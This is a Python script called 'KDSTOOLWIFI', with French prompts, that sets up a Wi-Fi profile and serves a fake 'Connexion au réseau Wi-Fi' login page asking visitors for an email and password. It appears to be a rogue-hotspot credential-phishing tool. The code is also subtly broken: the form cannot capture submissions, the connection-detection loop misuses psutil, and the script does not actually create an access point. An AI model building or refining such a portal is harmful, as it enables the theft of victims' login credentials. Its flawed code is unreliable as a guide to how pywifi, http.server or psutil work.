import pywifi
import psutil
import getpass
from colorama import init, Fore, Back, Style
import requests
import itertools
import http.server
import socketserver
import threading
import os

init(autoreset=True)

# Titre en ASCII
print(Fore.GREEN + """
  _______
 /       \
|  KDSTOOLWIFI  |
 _______/
""")

# Demande le nom du réseau Wi-Fi
wifi_name = input(Fore.CYAN + "Entrez le nom de votre réseau Wi-Fi : ")

# Demande si l'utilisateur veut mettre un mot de passe
password_required = input(Fore.CYAN + "Voulez-vous mettre un mot de passe pour votre réseau Wi-Fi ? (o/n) : ")

if password_required.lower() == 'o':
    # Demande le mot de passe
    password = getpass.getpass(Fore.CYAN + "Entrez le mot de passe pour votre réseau Wi-Fi : ")
else:
    password = None

# Crée un objet pywifi
wifi = pywifi.PyWiFi()

# Crée un réseau Wi-Fi
profile = pywifi.Profile()
profile.ssid = wifi_name
if password:
    profile.auth = pywifi.const.AUTH_ALG_PMK
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    profile.key = password
else:
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_NONE)
    profile.cipher = pywifi.const.CIPHER_TYPE_NONE

# Enregistre le profil
wifi.interfaces()[0].add_network_profile(profile)

# Active le réseau Wi-Fi
wifi.interfaces()[0].connect(profile)

print(Fore.GREEN + "Réseau Wi-Fi créé avec succès !")

# Crée une page HTML
html = """
<html>
  <head>
    <title>Connexion au réseau Wi-Fi</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
      }
      .container {
        width: 300px;
        margin: 50px auto;
        padding: 20px;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      .header {
        text-align: center;
        margin-bottom: 20px;
      }
      .header h1 {
        font-size: 24px;
        font-weight: bold;
        color: #333;
      }
      .form {
        margin-top: 20px;
      }
      .form input[type="email"], .form input[type="password"] {
        width: 100%;
        height: 40px;
        margin-bottom: 20px;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }
      .form input[type="submit"] {
        width: 100%;
        height: 40px;
        background-color: #4CAF50;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
      .form input[type="submit"]:hover {
        background-color: #3e8e41;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <h1>Connexion au réseau Wi-Fi</h1>
      </div>
      <form class="form" action="" method="post">
        <input type="email" name="email" placeholder="Adresse e-mail">
        <input type="password" name="password" placeholder="Mot de passe">
        <input type="submit" value="Se connecter">
      </form>
    </div>
  </body>
</html>
"""

# Enregistrez la page HTML dans un fichier
with open("index.html", "w") as f:
    f.write(html)

# Créez un serveur HTTP simple pour servir la page HTML
def serve_http():
    with socketserver.TCPServer(("", 80), http.server.SimpleHTTPRequestHandler) as httpd:
        print("Serving HTTP on port 80...")
        httpd.serve_forever()

# Démarrez le serveur HTTP dans un thread séparé
threading.Thread(target=serve_http).start()

# Redirige l'utilisateur vers la page HTML
os.system(f"start http://localhost:80/index.html")

# Affiche une page de connexion pour les utilisateurs
print(Fore.CYAN + """
  _______
 /       \
|  Connexion au réseau Wi-Fi  |
 _______/
""")

while True:
    # Attends que quelqu'un se connecte
    for interface in psutil.net_if_addrs():
        if interface.family == psutil.AF_LINK:
            print(Fore.GREEN + f"Quelqu'un s'est connecté à votre réseau Wi-Fi !")
            break
    else:
        continue
    break
